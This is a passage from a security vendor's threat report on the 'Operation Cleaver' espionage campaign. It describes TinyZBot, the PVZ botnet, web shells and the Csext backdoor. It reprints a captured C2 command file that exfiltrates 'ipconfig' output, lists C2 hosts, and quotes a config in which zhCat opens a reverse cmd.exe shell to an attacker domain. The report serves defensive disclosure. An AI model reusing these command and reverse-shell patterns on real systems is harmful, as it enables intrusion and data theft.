100-continue\n\n```\n```\nHTTP/1.1 100 Continue\n\n```\n<?xml version=”1.0” encoding=”utf-8”?>\n<soap:Envelope xmlns:soap=”http://schemas.xmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.\n```\nw3.org/2001/XMLSchema-instance”\n\n```\nxmlns:xsd=”http://www.w3.org/2001/XMLSchema”>\n<soap:Body><GetFile xmlns=”http://tempuri(dot)org/”><Id>00cf6217-8c7e-4598-b155-65ebd949bba9</\nId><AppType>XYZCO</AppType><IP /><Pass>abefc81</Pass><FileName>[ALL]__b93c-49a1-140914084450__\n\n[00000000000000000000000000000000].tmu</FileName></GetFile></soap:Body></soap:Envelope>\n\n```\nHTTP/1.1 200 OK\n\n```\nCache-Control: private, max-age=0\nContent-Type: text/xml; charset=utf-8\n```\nServer: Microsoft-IIS/7.5\n\n```\nX-AspNet-Version: 2.0.50727\nX-Powered-By: ASP.NET Date: Mon, 06 Oct 2014 13:36:47 GMT\n```\nContent-Length: 652\n\n```\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope xmlns:soap=”http://schemas.\nxmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance”\nxmlns:xsd=”http://www.w3.org/2001/XMLSchema”>\n<soap:Body><GetFileResponse xmlns=”http://tempuri(dot)org/”>\n<GetFileResult>OzIwMTQwOTE0X18wODQ0NTANClJVTkNNRD1jbWQuZXhlLC9DIGlwY29uZmlnIC9hbGwgP\nj4gIltJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dCIgMj4mMQ0KV\nVBMT0FEPVtJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dA0KREVMR\nVRFPVtJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dA==\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### TinyZBot Command and Control Protocol (cont.)\n\nThe command file downloaded in this example is as follows:\n\n\n;20140914__084450\nRUNCMD=cmd.exe,/C ipconfig /all >> “[INFOLDER]\\d2db696a-3367-4699-a815-df09098bc596.txt”2>&1\nUPLOAD=[INFOLDER]\\d2db696a-3367-4699-a815-df09098bc596.txt\nDELETE=[INFOLDER]\\d2db696a-3367-4699-a815-df09098bc596.txt\n\nThe first line is a timestamp of the command. The TinyZBot command parser ignores it. The\nRUNCMD line requests that cmd.exe be executed, with the command ipconfig /all being\nredirected to a file in a directory designated for files to be uploaded. The UPLOAD command\nrequests that this file is then uploaded over SOAP to the command and control server. The\nDELETE command then requests that the file be deleted from the infected system.\n\nThe following is a list of supported commands that TinyZBot responds to:7\n\n```\nCOPY\nREPLACE\n\n```\nDELETE\nUPLOAD\nFUPLOAD\nCLEARFILES\nCLEAROUPUTFOLDER\nSAVECONFIG\nSAVETOCFGFILE\n```\nRESTART\n\n```\nRestartForce\n\n\nUNLOADALL\nRELOADALL\nADDSEC\n```\nREMSEC\n\n```\nADDKV\nCHGKV\nREMKV\nADDK\nREMOVEK\n\n\nCommands such as GETINFO are often run on newly infected systems, as they decide whether\nthe infection has hit the correct target. There are additional SOAP commands, but they will not be\ncovered in detail. The following is a list of all the SOAP commands: CheckFileMD5, GetFile,\nGetFileList, GetServerTime, UploadFile.\n\n###### Deception\n\n\nTinyZBot is commonly installed using some form of deception. Recent versions use the resumebased methods reported in the Initial Compromise sections. An additional method was used for\nearlier versions. When early versions of TinyZBot were executed, they opened an image stored\nin the resource section of the executable and copied the malicious TinyZBot executable to the\n%AppData% directory.\n\nMany of the images identified were of the popular Lebanese singer and actress Haifa Wehbe. The\nbackdoor additionally replaced the original malicious executable with an appropriately named\nimage file and padded the image file with null bytes in order to mirror the original file size.\n\n\n-----\n\n##### CLEAVER\n\n\n###### History\n\nThe earliest known version on TinyZBot was compiled on January 27, 2013. This early version\nhad very little functionality. It was limited to logging keystroke data, sending emails, and creating\na link in the user’s startup folder for persistence. Its method of exfiltrating the logged keystrokes\nrelied upon a hardcoded email address stored in the binary. The sender email address was\n```\ndyanachear(at)beyondsys.com and emails were destined for testmail_00001(at)\nyahoo.com. The message was intended to look like common Viagra spam from China, but\n\n```\nwould be sent with the keystroke logging data as attachments, as well as system information.\nThe initial version did not provide any means of receiving commands and was obfuscated with\nSmartAssembly. The following iteration compiled on March 12, 2013, only contained minor bug\nfixes.\n\n\nThe next version was compiled on April 24, 2013. This version starts to look more like an\naverage bot. A command and control protocol was established, using HTTP and SOAP for the\nprotocol. The command and control server for this version was located at 173.192.144.68/\nDefaultWS(dot)asmx. This new command and control protocol allowed for the addition of\nquite a few other features. An update mechanism was added, and could be regularly scheduled,\nso unassisted periodic update checks were automatically performed. The SOAP API used a\ndynamic password mechanism, which required the computation of a simple key in order to\naccess certain parts of the API. The email data exfiltration method also underwent modification\nto be activated at a scheduled interval. There were also some changes, which looked to be bug\nfixes, such as limiting the number of times sending an email could fail.\n\nThe next day, April 25, 2013, a new version was compiled which allowed for self-deletion.\n\n\nOn May 14, 2013, we noticed a change which assisted in the identification of active targets.\nThe AppUsageId (at this point named AppType) was an identifier used by this organization in\norder to differentiate between targets infected with TinyZBot, meaning they could effectively\nrun multiple campaigns using the same command and control server and know which target\nwas infected. This also allowed for separate commands to be supplied to different targets\nwithout the need for per-bot commands. At this time, the AppUsageId was total0, but later\nwe observed names, which aligned with active targets. The exfiltration email address was also\nchanged to TerafficAnalyzer(at)yahoo.com.\n\nOn June 17, 2013, there was an addition that allowed for the loading of configuration data from\nthe PE’s resources. At this time, it was limited to the exfiltration email address. This version was\nnot obfuscated with SmartAssembly\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### History (cont.)\n\nWe do not see a new version of TinyZBot until June 7, 2014. There are quite a few notable\nimprovements, but nowhere near enough to indicate consistent development on the project for\na year. SmartAssembly was reused again. A method was added to detect what security related\nsoftware is installed. Avira antivirus was specifically targeted and disabled, due to its detection of\nthe new keystroke logger module added in this version. This keystroke logger source is publicly\navailable and referred to as DeadkeyLogger.\n\n\nA new string encryption class is added, but the code was copied and pasted from a Microsoft\nexample. The ability to extract Internet Explorer passwords was added. Clipboard monitoring\ncode was added, but not invoked. The emailing features were removed, but the classes which\npreviously contained them were still present but empty. Many more options were enabled to 7\nbe loaded from PE resources. The ability to add PE resources was added. Another version was\ncompiled on June 7, 2014, with no feature difference.\n\nOn June 17, 2014, we see the first instance of Binder_1, which is aptly named, as it is a binder.\nThe legitimate application used in this version of Binder_1 was compiled on August 22, 2013,\nand is a self-extracting archive of desktop wallpapers, including an image from the game Mirror’s\nEdge. The TinyZBot included was the version compiled on June 7, 2014.\n\n\nbe loaded from PE resources. The ability to add PE resources was added. Another version was\n\n\nThe version compiled on June 23, 2014, added functionality which allowed screenshots of the\ndesktop to be taken.\n\nOn August 2, 2014, we see another version without SmartAssembly obfuscation. A bug fix is made\nto the keystroke logging method, and clipboard monitoring is enabled.\n\n\nThree items were compiled on August 18, 2014. Two of them are TinyZBot binaries, which contain\na minor key logging bug fix. The third is a new Binder_1 instance, which contains one of the\nTinyZBot instances compiled that day. The legitimate application included in this binder is called\n```\nEasy_resume_creator and is a legitimate application named EasyRésuméCreatorPro. This\n\n```\nversion targeted a major Saudi Arabian oil company.\n\nFrom August 23 to August 26, 2014, new versions of TinyZBot were compiled with the\n```\nAppUsageIds targeting major oil and gas companies in Qatar and Kuwait, Ministries of Foreign\n\n```\nAffairs in the Persian Gulf, and a major airline holding company in UAE. These versions of\nTinyZBot moved towards a more modular architecture where each component was in its own\n.NET assembly. This was presumably done to limit antivirus detection of each individual file as\nwell as allow for dynamic updating of specific modules. All of these were included in their own\n```\nBinder_1 instance, which also dropped Easy_resume_creator.\n\n```\n\n-----\n\n##### CLEAVER\n\n\n###### History (cont.)\n\nThere also seem to be improved software engineering practices in many locations. FTP upload\nsupport was added, with hardcoded credentials of ano:1. This FTP upload functionality points\nto the command and control server, and is invoked by a command in the SOAP command and\ncontrol channel. These versions have the capability to install as a service.\n\n\nOn August 25, 2014, the version compiled on August 18 was submitted to VirusTotal in a ZIP\narchive located at http://dl.doosan-job(dot)com/cv/Easy_Resume_Creator```\nv2.0.zip. This indicates that TinyZBot is not only being installed while impersonating a résumé\n\n```\ncreation suite, but is also impersonating potential employers when distributed.\n\nOn September 9, 2014, a ZIP file containing TinyZBot and a configuration targeting a major US\nuniversity with its AppUsageId was created. This was discovered on an anonymous FTP server\nin the same IP range as dl.doosan-job(dot)com along with other malware.\n\n\nFrom September 11 through September 17, 2014, some TinyZBot components were compiled,\nalong with a new dropper. This dropper impersonated a tool to submit a résumé to Teledyne.\nWhen executed, the user is prompted to enter personal information, and at the end is given a\nbutton to submit the résumé to Teledyne, although nothing is actually submitted. While the user\nenters this information, their machine is infected with TinyZBot. The AppUsageIds for these\nversions target a major US-based university as well as an Israeli aerospace company. These\nversions began to include a new method of installing as a service. The service runs with the\nname Network Connectivity Manager.\n\n###### Interesting Notes\n\n\nTinyZBot, as well as some other tools (Csext, Net Crawler) initially would not run without a\ncommand line parameter set. This was likely to avoid detonation-based detection engines. This\ncommand line parameter was opensesemi which is often stored in the application’s code in\nan obfuscated manner. The binders and droppers for TinyZBot provided this command line\nargument and others when executing.\n\nTinyZBot uses a dynamic mutex. This was accomplished by combining a static preset prefix with\nthe active process ID. This allowed supplemental tools to keep TinyZBot running by enumerating\nevery process and checking if the process ID and mutex prefix existed. If no mutex and process\npair was located, another TinyZBot instance would be started.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Command and Control Servers\n```\n   • 88.150.214.168, United Kingdom, microsoftactiveservices(dot)com\n   • 95.211.241.249, Amsterdam, Noord-Holland, Netherlands\n   • 88.150.214.166, United Kingdom\n   • 173.192.144.68, Seattle, Washington, USA\n   • 188.227.180.213, United Kingdom\n   • 192.111.145.197, Rochester, New York, USA\n\n```\n\n###### Backdoors\n\nMultiple backdoors were used by this organization. These are scripts or applications that allowed\nfor command or code execution outside of the victim network. Many of their backdoors were web\napplications, added to web servers, so commands can be executed from a browser or client able 7\nto communicate with them. This group includes the results of the Shell Creator mentioned in the\n**Attribution section, as well as ASPX backdoors used by Nesha. A PHP shell was also observed,**\nwhich also included attribution to Nesha in its hashed password.\n\nAn ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered from\na staging server. This backdoor does not require authentication, and its use appears to be\nstraightforward. Its functionality breaks down into three fairly standard components: SQL queries,\nexecuting commands, and uploading files.\n\n\n-----\n\n##### CLEAVER\n\n\n**Figure 25: The ASPX backdoor named “Zh0uSh3ll”, allowing file**\n\nThis organization utilized backdoors which masqueraded as varying versions of Notepad. They\nreplace the existing Notepad.exe on the infected machine, and when run they call out to a\nremote server and execute any shell code returned by the remote server. There will be a detailed\nanalysis of these backdoors posted to Cylance’s blog in the future.\n\n\n###### PVZ\n\nPVZ is a name for a set of executables used together to create a botnet. The name PVZ was\nassigned by us as this is one of the few tools this organization has not named themselves.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### PVZ (cont.)\n\nThe components are as follows:\n\n\n\n- PVZ-In\n\n- PVZ-Out\n\n- Syn Flooder\n```\n• LoggerModule\n• XYNTService\n• Jasus\nXYNTService was not developed by the Cleaver team, but instead is a publicly available project\n\n```\nwhich executes an executable as a service.\n\n\n###### PVZ-In\n\n\n###### 7\n\n\nThe purpose of PVZ-In is to communicate with a command and control server. Communication\nis primarily unidirectional, as little information is provided from the bot to its command and\ncontrol server. The known command and control server is located at http://kundenpflege.\n```\nmenrad(dot)de/js/jquery/default.aspx and the command and control protocol only uses\n\n```\nHTTP. The commands as well as infected computer information are transferred in the ContentDisposition HTTP header, making the traffic easy to pass over as benign.\n\nWhen a command is received from the server, the results are stored in a central location on disk\nthat the PVZ tools utilize. Command functionality is limited to executing supplied commands,\ndownloading and executing executables as well as self-updating.\n\n\nThe debug file path for PVZ-In is:\n```\nC:\\Users\\parviz\\documents\\visual studio 2010\\Projects\\BotManager\\\nRelease\\BotManager.pdb\n\n```\n\nPVZ-In has been observed using the file name ossisvc.exe.\n\n###### PVZ-Out\n\n\nPVZ-Out is the other half of the command and control channel, primarily uploading results of\ncommands and keystroke logging data to a remote server. The known command and control server\nfor PVZ-Out is located at http://www.gesunddurchsjahr(dot)de/tor/default.aspx.\nMuch like PVZ-In, this command and control channel communicates with the Content-Disposition\nHTTP header, but for file data, POST data is supplied.\n\n\n-----\n\n##### CLEAVER\n\n\nData uploaded is often compressed, which can make it more difficult to detect the exfiltration of\nsensitive information.\n\nThe debug file path for PVZ-Out is:\n\n```\nC:\\Users\\Parviz\\documents\\visual studio 2010\\Projects\\SendModule\\\nRelease\\SendModule.pdb\n\n```\nPVZ-Out has been observed with the file name osppsvc.exe.\n\n\n###### SYN Flooder\n\nSYN Flooder is a simple network based denial of service tool. It is a command line utility capable of\nbeing invoked by PVZ-In. Targeting information is supplied via command line parameters.\nThe debug file path for SYN Flooder is:\n\n\nC:\\Users\\parviz\\Documents\\Visual Studio 2010\\Projects\\socket-test\\\n```\nRelease\\socket-test.pdb\n\n```\nSYN Flooder has been observed using the name ossysvc.exe.\n\n\n###### Logger Module\n\nLogger Module observes the user’s actions and records them to a file. The recorded actions include\nmouse clicks, active windows, keypresses, as well as clipboard data. The resulting log is written out\nto a location where PVZ-Out can exfiltrate it to its command and control server. Logger Module has\nbeen observed using the name ospcsvc.exe.\n\n\nThe following command and control servers for Logger Module have been observed:\n\n212.87.154.14, Baden-Wurttemberg, Germany, kundenpflege.menrad(dot)de\n```\n212.87.154.12, Baden-Wurttemberg, Germany, www.gesunddurchsjahr(dot)de\n\n```\n\n###### wndTest\n\nWndTest is the evolution of the PVZ tool chain into a single executable. The tool chain is minimized\ndown to a command and control communications, keystroke logging, and clipboard monitoring.\nThe command and control still supports upgrading, downloading, and executing of applications, as\nwell as executing batch scripts. WndTest installs as a service and has been observed attempting to\nimpersonate Adobe Report Service. WndTest starts using PHP servers for its command and control\nserver, some of which are listed as defaced sites.\n\n\n-----\n\n###### #OPCLEAVER\n\n\nWe have seen wndTest communicate with the following servers:\n\n- 209.208.97.44, Orlando, Florida, USA, www.lat(dot)am\n\n- 23.238.17.181, Tulsa, Oklahoma, USA, regulatorfix(dot)com\n\n- 209.208.97.44, Orlando, Florida, USA, www.asiess(dot)com\n\n- 198.50.100.210, Quebec, Canada, halon(dot)com.br\n```\n• 207.182.142.68, Columbus, Ohio, USA\n• 95.211.191.247, Amsterdam, Noord-Holland, Netherlands\n\n```\n\n###### Csext\n\nCsext is a backdoor application developed in C# which runs as a service. Its primary functionality\nis based on commands supplied by its configuration file. The configuration file is able to store\nspecific commands, which are intended to run at particular times. A recovered configuration is as\n\n###### 7\n\nfollows:\n\n\nspecific commands, which are intended to run at particular times. A recovered configuration is as\n\n\ndomain1=srv01.microsoftwindowsupdate(dot)net,check.html,3\n%%\n{0}\\{zhname}$$ -h -x -i {domain1} -p 443 -e c:\\windows\\system32\\cmd.\nexe,taskkill.exe$$/F /PID {pid},00:29,00:35\n%%\n```\n##\n\n```\nThis configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net (a\ndeceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor\nRelations) with XORed communication using the HTTP protocol on TCP port 443. This zhCat\ninstance is running cmd.exe, effectively making it a reverse connecting shell. This command\nruns at 00:29 in the morning, and is killed by taskkill at 00:35. This gives the attackers a\npredictable method to regain access to a compromised network if they ever lose access.\n\n\nCsext also has email functionality similar to TinyZBot. This email functionality is used to exfiltrate\nthe results of commands from the command file which can also include requests like gathering\nuser information.\n\nWe have seen Csext configured to communicate with the following servers:\n\n```\n• 78.47.102.90, Germany, srv01.microsoftwindowsupdate(dot)net\n\n```\n- 174.36.195.158, Washington D.C, USA, srv01.microsoftupdateserver(dot)\n```\nnet\n\n```\n\n-----\n\n##### CLEAVER\n\n\n## MITIGATION\n\n\nMITIGATION COVER\n\n\n##### TTP COVER HERE\n\n###### 7\n\n\n-----\n\n###### #OPCLEAVER\n\n\n##### MITIGATION\n\nIf after reviewing the Indicators of Compromise (IOC) listed in Appendix A, you believe your\norganization to be a victim of Operation Cleaver, we recommend you consider the following course\nof action:\n\n\n1. If inside the United States, contact the Federal Bureau of Investigation (FBI) via either your local\nFBI team or FBI CYWATCH at 1-855-292-3937 or cywatch@ic.fbi.gov.\n\n2. If outside the United States, contact your local, district, state or federal law enforcement\nauthorities.\n\n\n3. If you have visibility into the attacks on your company and the tools and expertise to track them 7\ndown, leverage the IOCs in **Appendix A to identify their presence in your network, prevent them**\nfrom expanding the scope of the compromise, and remove their access immediately.\n\n4. If you do NOT have visibility into the attacks, need help identifying an existing successful\ncompromise in your organization, or more importantly wish to prevent this attack or attacks similar\nto Operation Cleaver, please contact your security provider.\n\n\n3. If you have visibility into the attacks on your company and the tools and expertise to track them\n\n\n5. If you wish to contact Cylance for additional details not available in this report, please email\n**opcleaver@cylance.com.**\n\n6. If you would like to learn more about Cylance products and professional services, or discuss how\nCylance can mitigate Operation Cleaver’s impact to your organization, please contact us directly.\n\n\n###### +1 (877) 973 - 3336\n\n opcleaver@cylance.com\n\n\n###### www.cylance.com\n\n\n-----\n\n##### CLEAVER\n\n## SPECULATION\n\nSPECULATION COVER\n##### TTP COVER HERE\n\n###### 7\n\n\n-----\n\n###### #OPCLEAVER\n\n\n##### SPECULATION: THE WHY\n\nIran in 2014 can probably be best described as galvanizing. They have long been an “enemy” of\nthe west, and the United States in particular, but today’s headlines include a variety of topics from\nnuclear talks to human rights to terrorism to cyber hacking. Iran continues to be extremely active on\nthe global stage – and thereby on the radar of every superpower.[10]\n\n\nIran’s cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard\ndollars combined with national pride to help build their cyber army. Few doubt their commitment\nas a government and nation state to funding and recruiting cyber warriors to infiltrate and damage\ntheir enemies. And it has been commonly postulated that almost all activity since 2010 coming out\nof Iran is associated with retaliation for Stuxnet/Duqu/Flame, which seems natural given the severity\nof the impact. But they don’t need Stuxnet as motivation to want to hack the world. They have long 7\ndesired power on the political stage, in particular in the fight for nuclear power autonomy.\n\nWith the deadlines around the Iranian nuclear discussions pushed to 2015, the attacks may be tied\nto negotiating power when discussing a pact with the nuclear superpowers of United States, Britain,\nFrance, Germany, Russia and China.\n\n\nof the impact. But they don’t need Stuxnet as motivation to want to hack the world. They have long\n\n\nThe inner workings of the Iranian government remain largely a mystery to the western world.\nHowever, Iran’s control over its people and the private businesses birthed inside has been well\nreported. In a 2014 Reuters article, the reporters detail how the secret Iranian organization called\n“Setad Ejraiye Farmane Hazrate Emam” has become one of the most powerful organizations in the\ncountry, capable of taking over properties and businesses, buying controlling interests in numerous\nsectors including finance, oil, telecommunications and many others totaling in upwards of $95B.[11]\nEven the US Treasury has documented an extensive fronting of companies in its report of Execution\nof Imam Khomeini’s Order (EIKO), which through its two main subsidiaries controls 37 private\nbusinesses that are purely front companies for the Iranian government.[12]\n\nThe history of Iran controlling the usage of the Internet and the very Internet on-ramps into Iran is\nwell known[13, 14]. They have controlled much of the country’s Internet access to date and have taken\nover controlling interests in those companies to carry out their work. Given Operation Cleaver’s\nfrequent spin-up and take-down of large IP blocks inside the AFRANET IP space inside Iran,\nand Iran’s well recorded investment in cyber warfare[14] leads us to one simple conclusion: Iran is\nextremely active in the world of hacking.\n\n\n-----\n\n##### CLEAVER\n\n\n###### Speculation: The Why (cont.)\n\n**Involvement with North Korean**\n\n\nOperation Cleaver’s intense focus on critical infrastructure companies, especially in South Korea,\nhints at information sharing or joint operations with Iran’s partner, North Korea. In September,\n2012, Iran signed an extensive agreement for technology cooperation agreement with North\nKorea, which allows for collaboration on a variety of efforts including IT and security.[6]\n\n**Cyber Moving to Physical**\n\n\nOperation Cleaver’s carefully selected targets like the oil and gas industry, energy and utility\ncompanies, as well as airlines and airports, indicates Iran’s desire to gain deep access into the\nworld’s most critical environments. The end goal of this operation is not known at this time.\n\n**University Recruitment**\n\n\nUniversity student recruitment was hinted at within Operation Cleaver and is consistent with\nIran’s reported history of active warrior recruitment in the educational space.[15]\n\nOverall, there are many reasons that Iran may be pursuing the targets they did in Operation\nCleaver. While we may never truly know, it is important to consider all the above and more when\ntrying to understand the why.\n\n\n-----\n\n## CONCLUSION\n\n###### 7\n\n\n###### #OPCLEAVER\n\n\n-----\n\n##### CLEAVER\n\n\n##### CONCLUSION\n\nAfter tracking the Operation Cleaver team for over two years, we’re led to the inexorable\nconclusion: the government of Iran, and particularly the Islamic Revolutionary Guard Corps\n(IRGC), is backing numerous groups and front entities to attack the world’s critical infrastructure.\n\n\nAs security experts in Critical Infrastructure and Key Resources (CIKR), Industrial Control Systems\n(ICS), Supervisory Control and Data Acquisition (SCADA) systems, Building Management Systems\n(BMS), embedded systems and fixed-function systems, we know how easy they are to hack.\nWe have worked with countless customers and vendors throughout the years to notify them of\nvulnerabilities, assist with remediatation efforts, and help mitigate threats to their environments.\n\nUnfortunately, many critical infrastructure organizations are unable to secure their complex\nenvirnoments against modern attacks. They fall victim to the “glue flu”, a malaise of feeling stuck,\nnot wanting to change the status quo for fear they will find problems that they have no idea how\nto prevent. This “security anaphylaxis” spells real disaster.\n\n\nIf Operation Cleaver doesn’t get the world to wake up to what is happening in the silent world of\ncyber, then perhaps nothing will. Prevention is everything and we should never give up until it’s\nachieved.\n\nChallenge your trusted advisors. Challenge your security vendors. Demand better technology\nand services to detect, respond, but most importantly PREVENT not just contemporary attacks,\nbut future exotic attacks that have yet to be imagined. That is what truly disruptive and innovative\ntechnology is. Don’t settle for anything less.\n\n\nWe hope that by exposing the Operation Cleaver team to the world, current global critical\ninfrastructure victims can be notified, and prevent future victimization from suffering the\nconsequences of “status quo” security. Unlike United Flight 811, perhaps we can prevent the next\ndisaster.\n\n###### DEFENDERS, NEVER GIVE UP!\n\n\n-----\n\n###### #OPCLEAVER\n\n\n##### REFERENCES\n\n**[1] Aboard Flight 811: Passengers’ Routine Dissolves Into Terror - February 1989**\nhttp://www.nytimes.com/1989/02/26/us/aboard-flight-811-passengers-routine-dissolves-into-terror.html\n\n\n\n**[2] “Forget China: Iran’s Hackers Are American’s Newest Cyber Threat” - February 2014**\nhttp://complex.foreignpolicy.com/posts/2014/02/18/forget_china_iran_s_hackers_are_america_s_newest_cyber_\nthreat\n\n**[3] “Developments in Iranian Cyber Warfare 2013-2014” - August 2014**\nhttp://www.inss.org.il/uploadImages/systemFiles/SiboniKronenfeld.pdf\n\n\n\n**[4] “Iran ups cyber attacks on Israeli computers: Netanyahu” - June 2013**\nhttp://uk.reuters.com/article/2013/06/09/us-israel-iran-cyber-idUKBRE95808H20130609\n\n**[5] “Iranians hacked Navy network for four months? Not a surprise.” - February 2014**\n\n###### 7\n\nhttp://arstechnica.com/information-technology/2014/02/iranians-hacked-navy-network-for-4-months-not-a-surprise/\n\n\n\n**[6] “Iran and North Korea Sign Technology Treaty to Combat Hostile Malware” - September 2012**\nhttp://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware#\n\n**[7] “Iran’s Paramilitary Militia Is Recruiting Hackers” - January 2011**\nhttp://www.forbes.com/sites/jeffreycarr/2011/01/12/irans-paramilitary-militia-is-recruiting-hackers/\n\n\n\n**[8] “The Iranian Nuclear Weapon” - January 2014**\nhttp://webcache.googleusercontent.com/search?q=cache:eJbMz7vynpQJ:iranredline.org/index.\nphp%3Fid%3D22+&cd=1&hl=en&ct=clnk&gl=us\n\n**[9] “HPSR Threat Intelligence Briefing Episode 11, February 2014” - February 2014**\nhttp://www8.hp.com/h20195/v2/getpdf.aspx/4AA5-1589ENW.pdf?ver=1.0\n\n\n\n**[10] “Intel boss’ warning on cyber attacks no joke, say experts” - November 2014**\nhttp://www.foxnews.com/world/2014/11/23/intel-boss-warning-on-cyber-attacks-no-joke-say-experts/\n\n**[11] “Khamenei controls massive financial empire built on property seizures” - November 2013**\nhttp://www.reuters.com/investigates/iran/#article/part1\n\n\n\n**[12] “Treasury Targets Assets of Iranian Leadership” - June 2013**\nhttp://www.treasury.gov/press-center/press-releases/Pages/jl1968.aspx\n\n**[13] “Internet Censorship in Iran”**\nhttp://en.wikipedia.org/wiki/Internet_censorship_in_Iran\n\n\n\n**[14] “Iranian Internet - Fact and Faction”**\nhttp://surveillance.rsf.org/en/iran/\n\n**[15] “Iran readying hacker attacks on U.S. infrastructure, specialists say” - April 2012**\nhttp://www.washingtontimes.com/news/2012/apr/25/iran-readying-hacker-attacks-us-infrastructure-spe/?page=all\n\n\n-----\n\n##### CLEAVER\n\n\n##### ABOUT CYLANCE\n\nIn the face of growing and evolving threats, traditional cyber protection technologies are now\nwidely considered inadequate. The only way to regain the upper hand against a new generation\nof attackers, is to embrace something entirely new. Something that “thinks” like an attacker.\nSomething that doesn’t rely on a trust model or care about hash lookups. Something with a brain.\n\n\n**“The world has combated cyber threats by doing the same**\n**thing over and over again ... it’s the definition of insanity!”**\nJeff Moss - Co-Chair of the DHS Community Resiliency Task Force\n& Founder of BlackHat and DEFCON security conferences\n\nCylance has eschewed the old foundations that existing cybersecurity products are built upon.\nInstead, we’ve based our approach on mathematics, machine learning, and data science. This\nalgorithmic approach has been proven to detect – and stop – exponentially more modern threats.\n\n\nLeveraging algorithmic risk modeling, CylancePROTECT protects endpoints from everyday viruses,\nworms, trojans, and spyware, but unlike other security products, CylancePROTECT offers true\nfuture-proof protection against the most malicious threats in the world. Advanced Persistent Threats\n(APT), 0-days, and exotic exploitation techniques are easily detected and halted with little-to-no\nimpact on the end-user.\n\nExisting reactive solutions rely on a constant stream of signature updates for threat detection, which\nis not only costly and inconvenient, but also requires “sacrificial lambs”. Only after a previously\nunseen threat has inflicted damage can the rest of the industry begin to detect it. CylancePROTECT\ndoesn’t require constant updates or even a network connection to protect against so-called\n“previously undetectable” threats. By identifying and defusing attacks in near real time, before the\nattack can execute, we can finally do away with the need for a “patient zero”.\n\n\nAs Richard Stiennon, Chief Research Analyst at IT-Harvest, put it, “Many vendors are trying to solve\nthe endpoint problem, yet Cylance is the only one using the power of math to stop malware and\nwith more effectiveness and efficiency than current solutions”.\n\nInterested in seeing what CylancePROTECT can do for your organization? Contact us!\n\n\nCylance is one of the fastest growing cybersecurity technology firms in the US. Cylance’s flagship product\n**CylancePROTECT has been adopted by Fortune 500 companies and government agencies across the globe.** Cylance\nwas founded by 27-year security industry luminary, Stuart McClure, former Global CTO of McAfee, original founder\nof Foundstone, and lead author of the international best-selling book Hacking Exposed. In building Cylance, Stuart\nbrought together the best scientific and executive minds from the likes of Cisco, Sourcefire, Google and McAfee. The\nCylance board of advisors includes former high-ranking officials from the DHS, the FBI, CIA, and executive titans of\nbusiness.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n##### CYLANCE PRODUCTS\n\n**CylancePROTECT is the only next generation endpoint security product that applies math to**\nmute existing and future malware, viruses, worms, trojans, bots, APTs, 0-days, exploits, adware,\nspyware and hacking tools – without needing any updates or even a connection to the Internet.\nThe technology is founded on the principle that to fix the industry, you must start from scratch with\na way as yet unseen.\n\n\n**CylancePROTECT does not rely on signatures of any sort (blacklist or whitelist), behavioral**\nanalysis using IOCs, sandboxing analysis, heuristics, micro-virtualization, or dynamic detonation –\nto detect and prevent malicious files from executing on a target endpoint.\n\nWhile every other endpoint security product must collect a sample, analyze, and write a signature\nto detect it, CylancePROTECT can detect malware 7 **before it executes by statically analyzing**\nfeatures found in the binary itself.\n\n**Features and Benefits of CylancePROTECT:**\n\n- Near real time detection of malicious files, even if they’ve never been seen in the wild.\n\n- Can be used to augment existing endpoint security or be deployed as a complete replacement.\n\n- Does not require any signature updates or connection to the cloud.\n\n- An easy-to-use web management console with intuitive workflows.\n\n- Low-impact endpoint agent.\n\nFor a demo of CylancePROTECT, contact a Cylance expert today!\n\n**Figure 26: Cylance products detect and stop all the malware used in**\nOperation Cleaver, even though the vast majority of the samples are\n\n\n-----\n\n##### CLEAVER\n\n\n##### CYLANCE SERVICES\n\nCylance’s Professional Services team is available to assist companies affected by this campaign.\nCylance is providing consulting to companies that may have been targeted by these advanced\nthreat actors. Cylance will perform initial triage in order to determine the extent to which your\ncompany has been affected by this campaign and work towards establishing a containment\nstrategy.\n\nCylance has two tailored offerings for clients affected by this campaign. The first one includes\nICS in our incident response since many companies affected are in the Critical Infrastructure and\nKey Resources (CIKR) vertical. The second offering’s focus is to deploy our proprietary tools and\nmethodologies to detect and mitigate the threats posed by Operation Cleaver.\n\n\n**Option 1: ICS Incident Response & APT Detection and Mitigation**\n**Option 2: Detection, Remediation, & Mitigation**\n\nFor more information on how the Cylance Professional Services team can assess and respond to\nattacks like the ones obseved in Operation Cleaver, contact sales@cylance.com today.\n\n\nCheck the integrity of your\nenvironment and infrastructure.\n\nCUSTOM SERVICES\n\nGet expert help that addresses YOUR security needs.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n##### ACKNOWLEDGMENTS\n\n**Brian Wallace**\n\n\nBrian is a Sr. Security Researcher for Cylance who joined shortly after the company was established.\nHe is best known for his avid botnet research (often going by “botnet_hunter”) and for his novel\nmalware analysis in the A Study in Bots blog series hosted by Cylance. Brian has been a dedicated\nopen-source developer as well as an advocate for public and private anti-botnet operations.\nBrian actively develops techniques to combat cyber oppositions in positions where resources and\nleverage are in too limited of supply for conventional means. These techniques, cultivated by Stuart\nMcClure, are the Art of Deterrence. In a previous investigation, Art of Deterrence techniques were\nsuccessfully used to divert Indonesian hackers motivated by monetary gain away from their highest\nyielding target group.\n\n###### 7\n\nBrian’s botnet research covers a wide range of topics, from using graph analysis to estimate\nthe amount of ransom that has been paid to a ransomware operator, to utilizing IPv4 scanning\ntechniques to identify and take down point of 